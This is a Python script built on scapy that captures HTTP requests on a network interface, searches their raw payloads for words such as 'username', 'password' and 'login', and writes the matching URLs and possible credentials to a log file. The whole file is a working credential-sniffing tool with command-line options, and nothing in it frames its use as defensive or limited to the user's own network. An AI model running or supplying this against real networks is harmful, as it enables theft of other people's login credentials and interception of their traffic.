import scapy.all as scapy
from scapy.layers import http
import argparse

def sniff(interface, filter_expression, filter_keyword, log_file, count):
    captured_packets = []

    def process_sniffed_packet(packet):
        if packet.haslayer(http.HTTPRequest):
            captured_packets.append(packet)
            if count and len(captured_packets) >= count:
                return True

    scapy.sniff(iface=interface, filter=filter_expression, store=False, prn=process_sniffed_packet, stop_filter=lambda _: len(captured_packets) >= count if count else False)
    analyze_packets(captured_packets, filter_keyword, log_file)

def get_url(packet):
    return packet[http.HTTPRequest].Host + packet[http.HTTPRequest].Path if packet.haslayer(http.HTTPRequest) else ""

def get_login_info(packet):
    if packet.haslayer(scapy.Raw):
        try:
            load = packet[scapy.Raw].load.decode('utf-8', 'ignore')
            keywords = ["username", "user", "login", "admin", "password", "pass"]
            for keyword in keywords:
                if keyword in load:
                    return load
        except UnicodeDecodeError:
            pass
    return None

def analyze_packets(captured_packets, filter_keyword, log_file):
    with open(log_file, "a") as f:
        f.write("Captured Packets:\n")
        for packet in captured_packets:
            url = get_url(packet)
            login_info = get_login_info(packet)
            if login_info and (not filter_keyword or filter_keyword in login_info):
                f.write("[+] HTTP Request >> " + url + "\n")
                f.write("[+] Possible username/password >> " + login_info + "\n\n")

def get_arguments():
    parser = argparse.ArgumentParser()
    parser.add_argument("-i", "--interface", dest="interface", help="Specify the interface to sniff on")
    parser.add_argument("-e", "--expression", dest="expression", help="Specify the filter expression in BPF syntax")
    parser.add_argument("-f", "--filter", dest="filter", help="Filter keyword to limit the sniffing")
    parser.add_argument("-l", "--log", dest="log", help="Specify the log file")
    parser.add_argument("-c", "--count", dest="count", type=int, help="Specify the maximum number of packets to capture")
    options = parser.parse_args()
    return options

if __name__ == "__main__":
    options = get_arguments()
    interface = options.interface if options.interface else "eth0"
    filter_expression = options.expression if options.expression else ""
    filter_keyword = options.filter
    log_file = options.log if options.log else "sniff_log.txt"
    count = options.count

    sniff(interface, filter_expression, filter_keyword, log_file, count)